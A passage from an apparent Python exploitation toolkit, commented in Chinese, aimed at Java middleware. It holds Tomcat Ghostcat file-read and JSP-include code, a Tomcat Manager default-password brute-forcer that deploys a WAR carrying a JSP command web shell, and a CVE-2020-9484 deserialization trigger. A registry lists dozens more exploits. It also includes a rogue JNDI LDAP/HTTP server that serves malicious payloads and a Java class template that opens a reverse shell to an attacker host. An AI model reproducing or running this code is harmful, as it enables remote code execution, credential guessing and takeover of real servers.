                   "/".join(str(f["type"]) for f in res["frames"]) or "无帧"))
    head.append("HTTP 状态   : %s" % (res["status"] or "未解析到 Send Headers"))
    if res["headers"]:
        head.append("响应头      : %s" % "; ".join("%s=%s" % kv for kv in list(res["headers"].items())[:6]))
    if res["notes"]:
        head += ["⚠ %s" % n for n in res["notes"]]

    if not raw:
        head.append("")
        head.append("一个字节都没回 —— 常见原因：\n"
                    "  1) 目标 Tomcat 版本 > 9.0.31/8.5.51/7.0.100（已修，AJP 默认 requiredSecret）；\n"
                    "  2) AJP Connector 配了 secretRequired=true + secret=… （需要密钥）；\n"
                    "  3) 属性白名单挡住了 javax.servlet.include.*。")
        return {"ok": False, "output": "无任何回包（AJP 可能已加固或需要 secret）",
                "detail": "\n".join(head), "sent_len": len(pkt), "status": 0}

    detail = "\n".join(head)
    if mode == "probe":
        st = res["status"]
        if st in (200, 404):
            ok, verdict = True, "AJP 开放且大概率可以利用（%s 表示 AJP 已正常处理请求）" % st
        elif st == 403:
            ok, verdict = False, ("返回 403 —— **可疑但不能判死**：可能是 secret 校验、"
                                  "属性白名单拦截，也可能只是 patched 实例（secretRequired=false）"
                                  "对这个 URI 没权限。建议再试 mode=read 读 WEB-INF/web.xml 确认。")
        else:
            ok, verdict = False, "返回 %s —— 未能确认可利用" % (st or "未知状态")
    elif mode == "read":
        body = res["body"].decode("utf-8", "ignore")
        ok = bool(body.strip())
        verdict = ("读到 %d 字节。⚠ 只能读**当前 webapp 目录内**的文件："
                   "../ 会被 RequestUtil.normalize() 拒绝，file_path 别带穿越。"
                   % len(res["body"])) if ok else \
                  "没有读到内容（文件不存在、没有权限，或 AJP 侧被拦）"
        if ok:
            detail += "\n\n---- 文件内容（%s）----\n%s" % (file_path, body[:4000])
    else:
        ok = res["status"] == 200 and bool(res["body"].strip())
        body_len = len(res["body"])
        if ok and res["body"]:
            detail += "\n\n---- 渲染结果前 1500 字 ----\n%s" % res["body"][:1500].decode("utf-8", "ignore")
        if ok:
            verdict = ("拿到 %d 字节渲染结果 —— 说明 jsp_file 里的 JSP 代码被执行了。\n"
                       "  具体能不能当 shell 用，取决于你写进去的内容：先用一句 <%%=1+1%%> 之类\n"
                       "  的无害表达式验证渲染通道是通的，再换成真正的功能代码。"
                       % body_len)
        else:
            verdict = ("没拿到渲染结果：jsp_file 可能不在 webapp 目录内，或内容不是合法 JSP，"
                       "也可能这个 .jsp req_uri 根本没路由到 JspServlet。")
        if res["body"] and not ok:
            detail += "\n\n---- 拿到的内容前 800 字 ----\n%s" % res["body"][:800].decode("utf-8", "ignore")

    return {"ok": ok, "output": verdict.split("\n")[0],
            "detail": detail + "\n\n【判定】 " + verdict,
            "sent_len": len(pkt), "payload_len": len(payload), "status": res["status"]}


# ---------------- Manager：弱口令 + war 部署 ----------------
_MANAGER_WORDS = [
    ("tomcat", "tomcat"), ("tomcat", ""), ("admin", "admin"), ("admin", ""),
    ("manager", "manager"), ("both", "tomcat"), ("role1", "tomcat"),
    ("tomcat", "s3cret"), ("admin", "tomcat"), ("tomcat", "admin"),
    ("tomcat", "password"), ("admin", "password"),
]

_JSP_CMD = r'''<%@ page import="java.io.*,java.util.*" %>
<%
String c = request.getParameter("c");
if (c == null) { out.println("usage: ?c=command"); return; }
try {
    String os = System.getProperty("os.name").toLowerCase();
    Process p;
    if (os.contains("win")) {
        // Windows：cmd.exe /c
        p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", c});
    } else {
        // Linux/Unix：**数组形式** exec，避免 exec(String) 按空格切 argv 的老问题，
        // 由 sh -c 自己解释命令里的空格 / 管道 / 重定向。
        p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", c});
    }
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    PrintWriter out2 = new java.io.PrintWriter(response.getOutputStream(), true);
    String line;
    while ((line = br.readLine()) != null) out2.println(line);
    while ((line = er.readLine()) != null) out2.println(line);
    out2.flush();
} catch (Exception e) { out.println(e.toString()); }
%>'''


def _basic_auth(u, w):
    return "Basic " + base64.b64encode(("%s:%s" % (u, w)).encode("latin-1")).decode()


def build_manager_war(jsp_name="cmd.jsp"):
    """最小 war：zip 根目录只放一个 JSP，不写 WEB-INF/web.xml。

    Servlet 3.0+ 起 web.xml 非必需；省掉它在 Tomcat 7/8/9/10 上都最稳，
    不会因为 web.xml 版本声明与容器不匹配而部署失败。
    返回 war 二进制。
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        zi = zipfile.ZipInfo(jsp_name)
        zi.date_time = (2020, 1, 1, 0, 0, 0)
        zi.external_attr = 0o644 << 16
        z.writestr(zi, _JSP_CMD)
    return buf.getvalue()


def _manager_fail_body(body):
    """Manager 的 /manager/text/* 接口：HTTP 状态码常常仍是 200，
    真正的成败写在正文里 —— 必须以 `OK - ` / `FAIL - ` 判，不能只看 status。"""
    b = (body or "").lstrip()
    if b.startswith("FAIL") or b.startswith("- Error") or b.upper().startswith("FAIL -"):
        return True
    return False


def _manager_words(p):
    w = []
    u = (p.get("user") or "").strip()
    pw = p.get("pass")
    pw = "" if pw is None else pw
    if u:
        w.append((u, pw))
        return w
    return list(_MANAGER_WORDS)


def ex_tomcat_manager_deploy(target, p):
    """Manager 弱口令爆破 + deployment war 拿 shell。

    ⚠ path=/ + update=true 会**覆盖现有 ROOT 应用**，是破坏性操作。
    """
    base = normalize(target)
    if not base:
        return {"ok": False, "output": "target 为空", "detail": ""}
    to = int(p.get("timeout", 10) or 10)
    mode = (p.get("mode") or "brute").strip().lower()
    path = (p.get("path") or "/shell").strip()
    jsp_name = (p.get("jsp_name") or "cmd.jsp").strip().lstrip("/") or "cmd.jsp"
    cmd = (p.get("cmd") or "id").strip()

    warn_root = []
    if mode in ("deploy", "list") and path in ("/", "/ROOT", ""):
        warn_root.append("★ 破坏性提醒：path=%s 会**覆盖目标现有的 ROOT 应用**；"
                         "授权测试里建议用 /shell 这类独立路径。" % path)

    def _probe_list(u, w, show=True):
        r = http(base + "/manager/text/list", timeout=to,
                 headers={"Authorization": _basic_auth(u, w)}, allow_redirect=False)
        body = r["body"] or ""
        good = r["status"] == 200 and not _manager_fail_body(body) and bool(body.strip())
        return good, r["status"], body.strip()[:300]

    # ---- 爆破 / 复用凭据 ----
    cred = None
    lines = []
    if (p.get("user") or "").strip() or mode in ("brute", "deploy", "list"):
        for u, w in _manager_words(p):
            good, sc, body = _probe_list(u, w)
            lines.append("%-10s / %-12s → HTTP %s %s" % (
                u, w or "(空)", sc,
                "✔ 命中" if good else (body.splitlines()[0][:60] if body else "")))
            if good:
                cred = (u, w)
                break

    if mode == "brute":
        return {"ok": bool(cred),
                "output": ("命中弱口令: %s / %s" % cred) if cred else "内置字典未命中（%d 组）" % len(_manager_words(p)),
                "detail": "\n".join(lines) +
                          ("\n\n下一步：mode=list 列应用，mode=deploy 部署 war。"
                           if cred else
                           "\n\n没命中也不代表没戏：可能是 403 被 RemoteCIDRValve 的 IP 白名单拦了 ——\n"
                           "Tomcat 8.5+ 默认只允许 127.0.0.1/::1 访问 /manager，\n"
                           "**这种情况与口令无关**，得换 signalling：换本机做跳板、或利用 SSRF 打 127.0.0.1。"),
                "cred": ("%s:%s" % cred) if cred else ""}

    if mode == "list":
        if not cred:
            return {"ok": False, "output": "没有可用凭据（先跑 mode=brute 或手填 user/pass）",
                    "detail": "\n".join(lines) + "\n\n" + "\n".join(warn_root)}
        good, sc, body = _probe_list(*cred)
        return {"ok": good, "output": ("已列出应用（凭据 %s:%s）" % cred) if good else "列应用失败",
                "detail": "GET /manager/text/list → HTTP %s\n\n%s\n\n%s"
                          % (sc, body, "\n".join(warn_root))}

    if mode != "deploy":
        return {"ok": False, "output": "mode 只能是 brute / list / deploy", "detail": ""}

    if not cred:
        return {"ok": False, "output": "部署前必须先有有效凭据",
                "detail": "\n".join(lines) +
                          "\n\n先用 mode=brute 爆破，或在 user/pass 里手填一对 manager-script 角色的账号。"}

    war = build_manager_war(jsp_name)
    url = "%s/manager/text/deploy?path=%s&update=true" % (base, urllib.parse.quote(path))
    r = http(url, method="PUT", data=war, raw=True, timeout=max(to, 15),
             ctype="application/octet-stream",
             headers={"Authorization": _basic_auth(*cred)}, allow_redirect=False)
    body = (r["body"] or "").strip()
    sc = r["status"]
    head = ["war         : %d 字节（内含根目录 %s，无 WEB-INF/web.xml）" % (len(war), jsp_name),
            "PUT         : %s" % url,
            "凭据        : %s / %s" % (cred[0], cred[1] or "(空)"),
            "HTTP        : %s" % sc]
    head += warn_root

    if sc == 401:
        return {"ok": False, "output": "401 认证失败（账号口令不对）", "deploy_status": sc,
                "detail": "\n".join(head) + "\n\n" + body[:400]}
    if sc == 403:
        return {"ok": False, "output": "403 被拒绝 —— 多半与口令无关", "deploy_status": sc,
                "detail": "\n".join(head) + "\n\n" + body[:400] + "\n\n"
                          "★ 两种最常见原因：\n"
                          "  1) 账号没有 **manager-script** 角色（只有 manager-gui/html 也不能 deploy）；\n"
                          "  2) RemoteCIDRValve 的 IP 白名单 —— Tomcat 8.5+ **默认只允许 127.0.0.1/::1**\n"
                          "     访问 /manager。远程调用得先解决来源 IP（跳板 / SSRF 打 127.0.0.1）。"}
    deployed = (sc == 200 and not _manager_fail_body(body)
                and (body.startswith("OK") or "Deployed application" in body))
    if not deployed:
        return {"ok": False, "deploy_status": sc,
                "output": "部署失败：%s" % (body.splitlines()[0][:120] if body else "HTTP %s 且无正文" % sc),
                "detail": "\n".join(head) + "\n\n---- 返回正文 ----\n" + body[:1500] +
                          "\n\n★ 注意：Manager 的 text 接口失败时 HTTP 状态码**往往仍是 200**，\n"
                          "  所以本模块一律按正文的 OK - / FAIL - 判定，不看 status。"}

    head.append("部署结果    : %s" % body.splitlines()[0][:160])
    shell_url = "%s%s/%s?c=%s" % (base, path, jsp_name, urllib.parse.quote(cmd))
    try:
        vr = http(shell_url, timeout=to)
        vb, vsc = vr["body"], vr["status"]
    except Exception as e:
        vb, vsc = "", 0
        head.append("验证异常    : %s" % e)
    head.append("验证        : GET %s → HTTP %s" % (shell_url, vsc))
    ok = (vsc == 200 and bool((vb or "").strip()) and "usage:" not in vb[:80])
    if ok:
        head.append("")
        head.append("★ 已拿到命令执行：%s" % shell_url)
        head.append("---- `%s` 回显 ----" % cmd)
        head.append((vb or "")[:2000])
        verdict = "war 部署成功且 JSP 可执行（%s/%s）" % (path, jsp_name)
    else:
        head.append("")
        head.append("部署调用返回 OK，但访问 %s 没拿到回显。排查：\n"
                    "  1) 路径是否拼对（path=%s，jsp=%s）；\n"
                    "  2) 刚部署完可能还没热起来，隔 1~2 秒重试；\n"
                    "  3) 目标可能有 SecurityManager 或容器级 JSP 禁用。" % (shell_url, path, jsp_name))
        verdict = "war 部署成功但 JSP 未回显（见下方排查）"
    return {"ok": ok, "output": verdict, "detail": "\n".join(head),
            "shell_url": shell_url, "deploy_status": sc}


# ---------------- CVE-2020-9484 ----------------
def ex_tomcat_session_filestore(target, p):
    """CVE-2020-9484：FileStore session 反序列化。

    FileStore.file(id) = <id>.session，默认 directory "." 解析到 work 目录；
    StandardSession.doReadObject() 第一个 readObject() 读到的就是 payload 顶层对象 →
    gadget 当场触发，之后的 (Long) 转型抛 ClassCastException 只是善后。
    所以**裸 ysoserial 字节即可**，不需要拼完整 Session 结构。

    ⚠ **本模块不写文件** —— 必须先有一个上传点把 .session 内容放到目标上，
       然后用 JSESSIONID 穿越到那个文件触发。
    """
    base = normalize(target)
    if not base:
        return {"ok": False, "output": "target 为空", "detail": ""}
    to = int(p.get("timeout", 10) or 10)
    sp = (p.get("session_path") or "").strip()
    trigger = (p.get("trigger_path") or "/index.jsp").strip()
    gadget = (p.get("gadget") or "CommonsCollections6").strip()
    cmd = (p.get("cmd") or "").strip()
    auto = False
    if not cmd or cmd.upper() in ("REVERSE", "SHELL"):
        cmd = _reverse_cmd(p, target)
        auto = True
    okc, cnote = _exec_cmd_check(cmd, target)
    if not okc:
        return {"ok": False, "output": "命令不可用", "detail": cnote}
    if not sp:
        return {"ok": False, "output": "必须填 session_path",
                "detail": "CVE-2020-9484 需要**目标上已经存在**一个内容是序列化 payload 的文件。\n"
                          "本模块只负责触发，**不负责写文件**：\n"
                          "  · 先用 ysoserial 生成要用的那段字节（见下方 gadget/cmd）；\n"
                          "  · 再用工具箱已有的 **shell.upload**（经反弹 shell 上传）或\n"
                          "    **webshell.drop**（落地一句话后经马上传）把它放到目标上；\n"
                          "  · 然后 session_path 填那个文件（不带 .session 后缀），可以用 ../ 穿越。"}

    raw, err = yso_generate(gadget, cmd)
    lines = ["目标          : %s" % base,
             "session 文件  : %s  → FileStore 实际读 %s.session" % (sp, sp),
             "触发路径      : %s（必须会调 request.getSession()）" % trigger,
             "gadget        : %s" % gadget,
             "自动拼命令    : %s" % ("是 → " + cmd if auto else "否")]
    if cnote:
        lines.append(cnote)
    lines.append("")
    lines.append("【本次要写进目标文件的字节】 ysoserial %s \"%s\" → %d 字节（%s…）"
                 % (gadget, cmd, len(raw) if raw else 0, raw[:4].hex() if raw else ""))
    if not raw:
        lines.append("生成失败：%s" % err)
        return {"ok": False, "output": "payload 生成失败", "detail": "\n".join(lines)}

    turl = base + trigger
    tr = http(turl, headers={"Cookie": "JSESSIONID=%s" % sp}, timeout=to, allow_redirect=False)
    tsc, tbody = tr["status"], tr["body"]
    lines.append("【触发】 GET %s  Cookie: JSESSIONID=%s → HTTP %s" % (turl, sp, tsc))

    evid = [k for k in ("ClassCastException", gadget, "ysoserial", "PriorityQueue",
                        "InvocationTargetException", "TemplatesImpl") if k in (tbody or "")]
    if tsc == 500 and evid:
        ok = True
        verdict = ("★ payload 已触发：命令在异常抛出**之前**就执行了（命中 %s）" % "、".join(evid))
    elif tsc == 500:
        ok = False
        verdict = ("返回 500 但响应体没看到 ClassCastException / %s —— 可能是别处的 500，"
                   "也可能 FileStore 读到的根本不是你的 payload。用带外或反弹确认。" % gadget)
    elif tsc == 0:
        return {"ok": False, "output": "目标不可达：%s" % (tr["err"] or "连接失败"),
                "detail": "\n".join(lines)}
    else:
        ok = False
        verdict = ("返回 %s —— 多半没走到 session 查找。排查：\n"
                   "  1) 触发端点必须会 request.getSession() —— 默认 JSP 会，静态资源不会；\n"
                   "  2) session_path 对不对？FileStore 会拼上 .session，"
                   "且默认 directory 是相对 work 目录的，需要 ../ 穿越到文件真实位置；\n"
                   "  3) 是否真的配了 PersistentManager + FileStore？没配就不会读文件。" % tsc)
    lines.append("")
    lines.append("【判定】 %s" % verdict)
    lines.append("")
    lines.append("★ 写文件请用工具箱已有的 shell.upload / webshell.drop —— 本模块不提供写能力。")
    return {"ok": ok, "output": verdict.split("\n")[0],
            "detail": "\n".join(lines) + ("\n\n---- 响应体前 800 字 ----\n" + tbody[:800] if tbody else ""),
            "trigger_status": tsc}


# ---------------- serrefA / serrefB 层级自动判定 ----------------
def _serref_variant_for(version):
    """按 Tomcat 版本判断该用哪条 ResourceRef 层级。

      B = 新层级 ResourceRef → AbstractRef → Reference（Tomcat 8.5.7x+ / 9.0.4x+ / 10.x / 11.x）
      A = 老层级 ResourceRef 直连 Reference（8.0.x / 8.5.<70 / 9.0.<40 / 7.x）

    返回 (variant, 理由)；版本未知返回 (None, 理由)。
    """
    t = _ver_tuple(version)
    if not t:
        return None, "版本未知"
    maj = t[0]
    mnr = t[1] if len(t) > 1 else 0
    pat = t[2] if len(t) > 2 else 0
    if maj >= 10:
        return "B", "Tomcat %s 的 ResourceRef 一律走 ResourceRef→AbstractRef→Reference 新层级" % version
    if maj == 9 and (mnr > 0 or (mnr == 0 and pat >= 40)):
        return "B", "Tomcat %s ≥ 9.0.40，ResourceRef 已改为继承 AbstractRef" % version
    if maj == 8 and mnr == 5 and pat >= 70:
        return "B", "Tomcat %s ≥ 8.5.70，ResourceRef 已改为继承 AbstractRef" % version
    if maj == 8 and mnr == 5 and pat < 70:
        return "A", "Tomcat %s < 8.5.70，ResourceRef 仍直连 Reference" % version
    return "A", "Tomcat %s 属老层级，ResourceRef 直连 Reference" % version


def ex_tomcat_serref_variant(target, p):
    """告诉你在 BeanFactory 绕过里该用 serrefA 还是 serrefB —— 省掉手动逐个试。

    version 留空时会用 tomcat.probe 的同款逻辑去现场探测（GET / 的 Server 头 →
    RELEASE-NOTES → 错误页），探测不到就退化成「先试 B、自动回退 A」。
    """
    base = normalize(target)
    to = int(p.get("timeout", 6) or 6)
    ver = (p.get("version") or "").strip()
    how = "手工指定"
    evid = []
    if not ver and base:
        ver, evid = _tomcat_version(base, to)
        how = "现场探测"
    variant, why = _serref_variant_for(ver)
    lines = ["目标        : %s" % (base or "-"),
             "版本来源    : %s" % how,
             "版本        : %s" % (ver or "未识别")]
    lines += ["             %s" % e for e in evid[:6]]
    lines.append("")
    if variant:
        other = "A" if variant == "B" else "B"
        lines.append("★ 结论: 用 **serref%s** —— %s" % (variant, why))
        lines.append("")
        lines.append("后续怎么做：")
        lines.append("  1) 起 JNDI 服务时把 tomcat_version=%s 带上（留空则自动探测），" % ver)
        lines.append("     LDAP 就会固定下发 serref%s，不再轮流两个变体试错；" % variant)
        lines.append("  2) 若依然失败，再手动换 serref%s —— 有些镜像改过 naming 包。" % other)
        lines.append("")
        lines.append("原理：Tomcat 的 BeanFactory 要求 obj instanceof ResourceRef，而这个类的父类层级\n"
                     "在不同版本里不一样。本地 tools/serrefA、tools/serrefB 两个目录就是按这两种层级\n"
                     "分别编译好的对象：选错的那侧在目标上会 ClassNotFoundException / 压根不触发。")
    else:
        lines.append("★ 结论: 版本没探到 —— 采用「先试 B、失败自动回退 A」的策略（顺序 B→A）。")
        lines.append("")
        lines.append("  · 已知更可能是新版 Tomcat（连 Server 头被删也不用慌），优先 B；")
        lines.append("  · 起 JNDI 服务时不填 tomcat_version 就是这个行为：每个 LDAP SearchRequest\n"
                     "    轮换下发一个变体（B→A→B…），直到某个接通 —— 看监听/HTTP 回调就知道是哪个。")
    # 顺带报一下本机这两个 serref 是否齐备
    have = [v for v in ("A", "B") if os.path.isdir(os.path.join(HERE, "tools", "serref" + v))]
    lines.append("")
    lines.append("本机 serref 可用: %s%s" % ("/".join(have) or "无",
                                            "" if len(have) == 2 else "  ⚠ 缺一个就没得自动回退"))
    if not shutil.which("java"):
        lines.append("⚠ 本机没有 java —— 两条都生成不了，只能退化成普通 Reference。")
    return {"ok": bool(variant),
            "output": ("用 serref%s（Tomcat %s）" % (variant, ver)) if variant
                      else "版本未知：先试 B，自动回退 A",
            "detail": "\n".join(lines),
            "variant": variant or "", "version": ver}


EXPLOITS = {
    "shiro.brutekey": ex_shiro_brutekey,
    "shiro.exploit": ex_shiro_exploit,
    "fastjson.send": ex_fastjson_send,
    "fastjson.version": ex_fastjson_version,
    "fastjson.probe": ex_fastjson_probe,
    "fastjson.183": ex_fastjson_183,
    "log4j2.send": ex_log4j2_send,
    "struts2.cmd": ex_struts2_cmd,
    "struts2.probe": ex_struts2_probe,
    "xxljob.cmd": ex_xxljob_cmd,
    "xxljob.login": ex_xxljob_login,
    "nacos.users": ex_nacos_users,
    "nacos.derby": ex_nacos_derby,
    "springboot.actuator": ex_springboot_actuator,
    "springboot.env": ex_springboot_env,
    "springboot.gateway": ex_springboot_gateway,
    "jboss.exploit": ex_jboss_exploit,
    "jackson.send": ex_jackson_send,
    "weblogic.probe": ex_weblogic_probe,
    "weblogic.t3": ex_weblogic_t3,
    "weblogic.weak": ex_weblogic_weak,
    "weblogic.fileread": ex_weblogic_fileread,
    "weblogic.payload": ex_weblogic_payload,
    "xstream.probe": ex_xstream_probe,
    "xstream.cmd": ex_xstream_cmd,
    "generic.shell": ex_generic_shell,
    "auto.chain": ex_auto_chain,
    "shell.upload": ex_shell_upload,
    "shell.download": ex_shell_download,
    "webshell.drop": ex_webshell_drop,
    "tomcat.probe": ex_tomcat_probe,
    "tomcat.tribes_rce": ex_tomcat_tribes_rce,
    "tomcat.session_put": ex_tomcat_session_put,
    "tomcat.ajp_ghostcat": ex_tomcat_ajp_ghostcat,
    "tomcat.manager_deploy": ex_tomcat_manager_deploy,
    "tomcat.session_filestore": ex_tomcat_session_filestore,
    "tomcat.serref_variant": ex_tomcat_serref_variant,
}


# ============================================================
# JNDI 服务（LDAP + HTTP）
# ============================================================
def _ber_len(b, i):
    l = b[i]
    i += 1
    if l < 0x80:
        return l, i
    n = l & 0x7F
    return int.from_bytes(b[i:i + n], "big"), i + n


def _tlen(n):
    if n < 0x80:
        return bytes([n])
    if n < 0x100:
        return b"\x81" + bytes([n])
    if n < 0x10000:
        return b"\x82" + n.to_bytes(2, "big")
    return b"\x83" + n.to_bytes(3, "big")


def _seq(b):
    return b"\x30" + _tlen(len(b)) + b


def _oct(s):
    b = s.encode() if isinstance(s, str) else s
    return b"\x04" + _tlen(len(b)) + b


def _enum(v):
    return b"\x0a\x01" + bytes([v])


def _int(v):
    b = v.to_bytes(max(1, (v.bit_length() + 7) // 8), "big")
    return b"\x02" + _tlen(len(b)) + b


def _set(items):
    return b"\x31" + _tlen(sum(len(x) for x in items)) + b"".join(items)


def _pick_serref_variant(state, ser):
    """在可用的 ResourceRef 变体里挑一条。返回 (variant, 理由)。

    策略（避免人工来回试）：
      ① state["ser_variant"] 已由 tomcat_version 定好 → 固定下发那一条；
      ② state["ser_order"] 给了优先级（缺省 B 在先）→ 按序轮流，
         这样客户端重试一次就自动落到另一条，不需要用户手动切换。
    """
    order = [x for x in (state.get("ser_order") or ("B", "A")) if x in ser] \
        or [x for x in ("B", "A") if x in ser]
    if not order:
        return "", "没有可下发的变体"
    want = state.get("ser_variant")
    if want in order:
        return want, "按 Tomcat %s 选定" % (state.get("tomcat_version") or "?")
    if want:
        # 版本结论指向的那条本机没生成出来 —— 不能硬返回它（下游会 KeyError），
        # 老实退回实际有的那条，并在理由里说清楚这层落差。
        return order[0], ("本机没生成出 serref%s（版本 %s 本应用它），降级用 serref%s"
                          % (want, state.get("tomcat_version") or "?", order[0]))
    idx = int(state.get("ser_idx") or 0)
    state["ser_idx"] = idx + 1
    return order[idx % len(order)], "版本未知，轮流试错(%s)" % "→".join(order)


class LDAPHandler(socketserver.BaseRequestHandler):
    """JNDI/LDAP 服务端。注意：TCP 会粘包，一次 recv 可能含多条 LDAPMessage，
    必须按 BER 长度把缓冲区里所有完整消息逐个处理，否则 Bind+Search 粘在一起时会丢掉 Search。"""

    def _handle_msg(self, msg, peer):
        try:
            _, i = _ber_len(msg, 1)
            mid = 1
            if i < len(msg) and msg[i] == 0x02:
                i += 1
                ln, i = _ber_len(msg, i)
                mid = int.from_bytes(msg[i:i + ln], "big")
                i += ln
            op = msg[i] if i < len(msg) else 0
        except Exception:
            op = 0x60
            mid = 1
        log("LDAP op=0x%02x mid=%s len=%d from %s" % (op, mid, len(msg), peer))
        if op == 0x60:      # BindRequest
            lr = _enum(0) + _oct("") + _oct("")     # LDAPResult: enum+DN+msg
            resp = _seq(_int(mid) + b"\x61" + _tlen(len(lr)) + lr)
            self.request.sendall(resp)
            add_callback("LDAP-Bind", peer, "JNDI 客户端握手")
        elif op == 0x63:    # SearchRequest
            j = STATE["jndi"]
            codebase = j.get("payload_url") or ("http://%s:%s/" % (
                j.get("lhost") or local_ips()[0], j["http_port"]))
            factory = j.get("factory") or "Exploit"
            if j.get("mode") == "bypass" and (j.get("ser") or j.get("el")):
                ser = j.get("ser") or {}
                log("LDAP bypass: ser=%s" % ("/".join(ser.keys()) or "普通Reference(不推荐)"))
                if ser:
                    v, why = _pick_serref_variant(j, ser)
                    if v not in ser:            # 兜底：绝不拿空/不存在的 key 去下标
                        v, why = sorted(ser.keys())[0], "兜底取仅有的 serref%s" % v
                    j["ser_used"] = v
                    log("LDAP bypass: 下发 serref%s（%s）" % (v, why))
                    attrs = b"".join([
                        _seq(_oct("javaClassName") + _set([_oct("javax.el.ELProcessor")])),
                        _seq(_oct("objectClass") + _set([_oct("javaObject"), _oct("javaSerializedData")])),
                        _seq(_oct("javaSerializedData") + _set([_oct(ser[v])])),
                    ])
                    detail = "下发序列化ResourceRef[%s] BeanFactory→ELProcessor（%s，反弹 %s:%s）" % (
                        v, why, j.get("lhost"), j.get("lport"))
                else:
                    # java 缺失时的退化路径：普通 Reference（仅对支持普通 Reference 的工厂有效）
                    attrs = b"".join([
                        _seq(_oct("objectClass") + _set([_oct("javaNamingReference")])),
                        _seq(_oct("javaClassName") + _set([_oct("javax.el.ELProcessor")])),
                        _seq(_oct("javaFactory") + _set([_oct("org.apache.naming.factory.BeanFactory")])),
                        _seq(_oct("javaReferenceAddress") + _set([
                            _oct("#0#forceString#x=eval"),
                            _oct("#1#x#" + j["el"]),
                        ])),
                    ])
                    detail = "下发高版本绕过引用 BeanFactory→ELProcessor (反弹 %s:%s)" % (
                        j.get("lhost"), j.get("lport"))
            else:
                attrs = b"".join([
                    _seq(_oct("javaClassName") + _set([_oct(factory)])),
                    _seq(_oct("javaCodeBase") + _set([_oct(codebase)])),
                    _seq(_oct("objectClass") + _set([_oct("javaNamingReference")])),
                    _seq(_oct("javaFactory") + _set([_oct(factory)])),
                ])
                detail = "下发引用 %s → %s" % (factory, codebase)
            entry = b"\x64" + _tlen(len(_oct("cn=deserkit,dc=x") + _seq(attrs))) + \
                _oct("cn=deserkit,dc=x") + _seq(attrs)
            lr = _enum(0) + _oct("") + _oct("")
            done = b"\x65" + _tlen(len(lr)) + lr     # SearchResultDone: 0x65+LDAPResult
            try:
                write_runtime_file("_last_search.bin",
                                   _seq(_int(mid) + entry) + _seq(_int(mid) + done))
            except Exception:
                pass
            self.request.sendall(_seq(_int(mid) + entry))
            self.request.sendall(_seq(_int(mid) + done))
            add_callback("LDAP-Search", peer, detail)
        elif op == 0x42:    # Unbind
            return False
        return True

    def handle(self):
        peer = self.client_address[0]
        buf = b""
        try:
            while True:
                data = self.request.recv(8192)
                if not data:
                    return
                buf += data
                # 按 BER 长度逐条切出完整消息（处理 TCP 粘包 / 半包）
                while buf:
                    if buf[0] != 0x30:
                        buf = b""
                        break
                    try:
                        ln, i = _ber_len(buf, 1)
                    except Exception:
                        buf = b""
                        break
                    total = i + ln
                    if total <= 0 or len(buf) < total:
                        log('LDAP 等待更多数据: 需 %d 现有 %d' % (total, len(buf)))
                        break                      # 半包，等下一批数据
                    msg, buf = buf[:total], buf[total:]
                    if self._handle_msg(msg, peer) is False:
                        return
        except Exception as e:
            log('LDAP 处理异常: %s: %s' % (type(e).__name__, e))
            return


class _LDAPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


class ClassHTTPHandler(httpsrv.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        add_callback("HTTP", self.client_address[0],
                     "%s %s (UA=%s)" % (self.command, self.path,
                                        self.headers.get("User-Agent", "-")[:60]))
        path = self.path.split("?")[0].strip("/")
        if path in ("", "Exploit.class", "deserkit.class"):
            f = os.path.join(STATE["jndi"].get("webroot", HERE), "Exploit.class")
            if os.path.isfile(f):
                data = open(f, "rb").read()
                self.send_response(200)
                self.send_header("Content-Type", "application/java")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                return
        # 按 path 直发 webroot 里的任意文件（fastjson 1.2.83 的 jar: 资源探测 /
        # JNDI 远程类加载共用）。仅允许单段文件名，防目录穿越。
        if path and "/" not in path and ".." not in path:
            f = os.path.join(STATE["jndi"].get("webroot", HERE), path)
            if os.path.isfile(f):
                try:
                    data = open(f, "rb").read()
                except Exception:
                    data = b""
                if data:
                    self.send_response(200)
                    self.send_header("Content-Type",
                                     "application/java" if f.endswith((".class", ".jar"))
                                     else "application/octet-stream")
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
                    return
        # 其余路径一律返回 200：供 EL 信标 URL.openStream() 成功（避免 404 抛
        # FileNotFoundException 中断 ELProcessor.eval），在“回调”面板留下 HTTP 记录。
        body = b"ok"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):
        self.do_GET()


class _HTTPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


EXPLOIT_JAVA = """public class Exploit {
    static {
        new Thread(() -> {
            try {
                new java.net.URL("%CODEBASE%exec-ok").getContent();
            } catch (Exception e) {
            }
            try {
                java.net.Socket s = new java.net.Socket("%LHOST%", %LPORT%);
                java.lang.Process pp = null;
                for (String sh : new String[]{"/bin/sh", "/bin/bash", "sh", "cmd.exe"}) {
                    try {
                        pp = java.lang.Runtime.getRuntime().exec(new String[]{sh});
                        break;
                    } catch (Exception e) {
                    }
                }
                if (pp != null) {
                    final java.net.Socket fs = s;
                    final java.lang.Process fp = pp;
                    new Thread(() -> {
                        try {
                            byte[] b = new byte[4096];
                            int n;
                            java.io.InputStream in = fs.getInputStream();
                            java.io.OutputStream out = fp.getOutputStream();
                            while ((n = in.read(b)) > 0) {
                                out.write(b, 0, n);
                                out.flush();
                            }
                        } catch (Exception e) {
                        }
                    }).start();
                    try {
                        byte[] b = new byte[4096];
                        int n;
                        java.io.InputStream in = fp.getInputStream();
                        java.io.OutputStream out = fs.getOutputStream();
                        while ((n = in.read(b)) > 0) {
                            out.write(b, 0, n);
                            out.flush();
                        }
                    } catch (Exception e) {
                    }
                } else {
                    String cmd = "%CMD%";
                    String[] shells = {"/bin/sh", "/bin/bash", "cmd.exe"};
                    for (String sh : shells) {
                        try {
                            java.lang.Runtime.getRuntime().exec(new String[]{sh, "-c", cmd});
                            break;
                        } catch (Exception e) {
                        }
                    }
                }
